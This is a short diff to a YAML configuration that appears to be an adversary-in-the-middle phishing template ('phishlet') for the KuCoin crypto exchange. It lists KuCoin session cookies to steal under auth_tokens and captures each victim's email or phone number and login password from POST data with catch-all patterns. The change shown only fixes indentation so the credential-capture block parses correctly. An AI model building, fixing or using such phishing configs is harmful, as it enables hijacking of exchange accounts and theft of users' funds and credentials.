@@ -30,14 +30,14 @@ auth_tokens:
     keys: ['x-bullet-token, kucoinv2_bulletTokenKeyPrivate, kucoinv2_bulletTokenUidKey, kucoinv2_clientId, kucoinv2_login_key']
 
 credentials:
-   username:
-  - key: 'Email/Phone Number'
-    search: ['(.*)']
-    type: 'post'
-   password:
-  - key: 'Login Password'
-    search: ['(.*)']
-    type: 'post'
+  username:
+    - key: 'Email/Phone Number'
+      search: ['(.*)']
+      type: 'post'
+  password:
+    - key: 'Login Password'
+      search: ['(.*)']
+      type: 'post'
 
 
 login:
